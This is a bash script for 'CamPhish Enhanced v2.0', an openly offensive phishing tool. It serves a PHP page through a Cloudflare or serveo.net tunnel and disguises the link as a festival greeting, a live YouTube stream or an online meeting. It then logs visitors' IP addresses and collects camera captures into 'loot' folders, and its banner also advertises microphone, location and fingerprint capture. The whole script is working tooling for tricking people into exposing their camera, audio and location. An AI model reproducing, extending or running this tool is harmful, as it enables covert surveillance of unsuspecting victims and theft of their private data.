#!/bin/bash

# CamPhish Enhanced v2.0 — Cloudflare Edition

# Original by TechChip, credits to thelinuxchoice [github.com/thelinuxchoice/]

# Enhanced: Back camera + Geolocation + Microphone + Automation
# Modified: Cloudflare Tunnel (cloudflared) replaces ngrok



trap 'printf "\n";stop' 2



# Create loot directories

mkdir -p ./loot/camera ./loot/audio 2>/dev/null



banner() {

clear

printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"

printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"

printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"

printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"

printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"

printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"

printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"

printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"

printf " \e[1;93m CamPhish Enhanced v2.0 \e[0m \n"

printf " \e[1;96m Camera(F/B) + Location + Mic + Fingerprint \e[0m \n"

printf " \e[1;94m ☁  Cloudflare Tunnel Edition \e[0m \n"

printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"



printf "\n"



}



dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }

}



stop() {

checkcf=$(ps aux | grep -o "cloudflared" | head -n1)

checkphp=$(ps aux | grep -o "php" | head -n1)

checkssh=$(ps aux | grep -o "ssh" | head -n1)

if [[ $checkcf == *'cloudflared'* ]]; then

pkill -f cloudflared > /dev/null 2>&1

killall cloudflared > /dev/null 2>&1

fi



if [[ $checkphp == *'php'* ]]; then

killall -2 php > /dev/null 2>&1

fi

if [[ $checkssh == *'ssh'* ]]; then

killall -2 ssh > /dev/null 2>&1

fi

# Cleanup temp files
rm -f .cloudflared.log

exit 1

}



catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')

IFS=$'\n'

printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip



cat ip.txt >> saved.ip.txt



}



checkfound() {

printf "\n"

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"

while [ true ]; do



if [[ -e "ip.txt" ]]; then

printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"

catch_ip

rm -rf ip.txt



fi



sleep 0.5



if [[ -e "Log.log" ]]; then

printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"

rm -rf Log.log

fi

sleep 0.5



done 

}



server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }



printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"



if [[ $checkphp == *'php'* ]]; then

killall -2 php > /dev/null 2>&1

fi



if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8

else

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8

fi

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"

fuser -k 3333/tcp > /dev/null 2>&1

php -S localhost:3333 > /dev/null 2>&1 &

sleep 3

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}



payload_cloudflare() {

# Link is already set by cloudflare_server()
sed 's+forwarding_link+'$link'+g' template.php > index.php

if [[ $option_tem -eq 1 ]]; then

sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html

sed 's+fes_name+'$fest_name'+g' index3.html > index2.html

elif [[ $option_tem -eq 2 ]]; then

sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html

sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html

else

sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html

fi

rm -rf index3.html

}



select_template() {

if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then

printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"

sleep 1

clear

banner

camphish

else

printf "\n-----Choose a template----\n"    

printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"

printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"

printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"

default_option_template="1"

read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem

option_tem="${option_tem:-${default_option_template}}"

if [[ $option_tem -eq 1 ]]; then

read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name

fest_name="${fest_name//[[:space:]]/}"

elif [[ $option_tem -eq 2 ]]; then

read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID

elif [[ $option_tem -eq 3 ]]; then

printf ""

else

printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"

sleep 1

select_template

fi

fi

}



cloudflare_server() {

# Check if cloudflared binary exists, download if needed
if [[ -e cloudflared ]]; then

echo ""

else

command -v cloudflared > /dev/null 2>&1

if [[ $? -eq 0 ]]; then

# cloudflared is in PATH, symlink it
ln -sf "$(which cloudflared)" ./cloudflared

else

command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;92m[\e[0m+\e[1;92m] Downloading cloudflared...\n"

arch=$(uname -m)

case "$arch" in

    aarch64|arm64)

        wget -q --no-check-certificate -O cloudflared "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"

        ;;

    armv7l|arm*)

        wget -q --no-check-certificate -O cloudflared "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"

        ;;

    x86_64|amd64)

        wget -q --no-check-certificate -O cloudflared "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"

        ;;

    i386|i686)

        wget -q --no-check-certificate -O cloudflared "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"

        ;;

    *)

        printf "\e[1;93m[!] Unsupported architecture: %s\e[0m\n" "$arch"

        exit 1

        ;;

esac

if [[ ! -e cloudflared ]]; then

printf "\e[1;93m[!] Download error...\e[0m\n"

exit 1

fi

chmod +x cloudflared

printf "\e[1;92m  ✓ cloudflared downloaded\e[0m\n"

fi

fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"

fuser -k 3333/tcp > /dev/null 2>&1

php -S 127.0.0.1:3333 > /dev/null 2>&1 & 

sleep 2

printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflare tunnel...\n"

# Clean up any previous log
rm -f .cloudflared.log

# Start cloudflared quick tunnel — no auth needed
./cloudflared tunnel --url http://127.0.0.1:3333 > .cloudflared.log 2>&1 &

CF_PID=$!

# Wait for the tunnel URL to appear (usually takes 5-15 seconds)
printf "\e[1;93m[\e[0m*\e[1;93m] Waiting for tunnel URL"

for i in $(seq 1 30); do
    link=$(grep -o 'https://[a-zA-Z0-9_-]*\.trycloudflare\.com' .cloudflared.log 2>/dev/null | head -n1)
    if [[ -n "$link" ]]; then
        printf " ✓\n"
        break
    fi
    printf "."
    sleep 1
done

if [[ -z "$link" ]]; then

printf "\n\e[1;31m[!] Failed to get Cloudflare tunnel URL. Check following:\e[0m\n"

printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"

printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Make sure no other cloudflared instance is running\n"

printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try: killall cloudflared\n"

printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check .cloudflared.log for errors\n"

exit 1

else

printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

fi

payload_cloudflare

checkfound

}



camphish() {

if [[ -e sendlink ]]; then

rm -rf sendlink

fi



printf "\n-----Choose mode----\n"    

printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Interactive (Classic)\e[0m\n"

printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Automated (CLI flags)\e[0m\n"

printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m View Loot\e[0m\n"

default_mode="1"

read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose mode: [Default is 1] \e[0m' mode_choice

mode_choice="${mode_choice:-${default_mode}}"



if [[ $mode_choice -eq 2 ]]; then

    printf "\e[1;93m[*] Launching automated mode...\e[0m\n"

    printf "\e[1;77m    Usage: ./camphish_auto.sh --tunnel cloudflare --template meeting\e[0m\n"

    printf "\e[1;77m    Run ./camphish_auto.sh --help for all options\e[0m\n"

    exit 0

elif [[ $mode_choice -eq 3 ]]; then

    bash loot_viewer.sh

    exit 0

fi



printf "\n-----Choose tunnel server----\n"    

printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare\e[0m\n"

printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"

default_option_server="1"

read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server

option_server="${option_server:-${default_option_server}}"

select_template

if [[ $option_server -eq 2 ]]; then

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

start



elif [[ $option_server -eq 1 ]]; then

cloudflare_server

else

printf "\e[1;93m [!] Invalid option!\e[0m\n"

sleep 1

clear

camphish

fi



}



payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' template.php > index.php

if [[ $option_tem -eq 1 ]]; then

sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html

sed 's+fes_name+'$fest_name'+g' index3.html > index2.html

elif [[ $option_tem -eq 2 ]]; then

sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html

sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html

else

sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index3.html

sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html

fi

rm -rf index3.html

}



start() {

default_choose_sub="Y"

default_subdomain="saycheese$RANDOM"



printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'

read choose_sub

choose_sub="${choose_sub:-${default_choose_sub}}"

if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then

subdomain_resp=true

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain

read subdomain

subdomain="${subdomain:-${default_subdomain}}"

fi



server

payload

checkfound

}



banner

dependencies

camphish